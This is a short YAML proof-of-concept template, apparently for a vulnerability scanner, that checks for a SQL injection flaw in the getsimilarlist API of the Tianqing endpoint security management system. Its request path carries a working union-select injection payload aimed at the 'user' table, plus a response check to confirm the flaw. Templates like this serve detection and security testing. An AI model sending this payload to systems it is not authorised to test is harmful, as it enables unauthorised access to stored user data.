id: poc-yaml-tianqing-getsimilarlist-sqli
info:
  name: 天擎终端安全管理系统 getsimilarlist status SQL 注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: 天擎终端安全管理系统
variables:
  v1: random_int(1000,10000)
requests:
- method: GET
  path: /api/client/getsimilarlist%3fstatus[0,1)+union+all+select+(/*!50000select*/+md5({{.v1}})),+setting,+setting,+status,+name,+create_time+from+"user"+where+1+in+(1]%3d1%26status[0]%3d1
  expression: status_code == 200 && contains(body, md5(v1))
transport: http
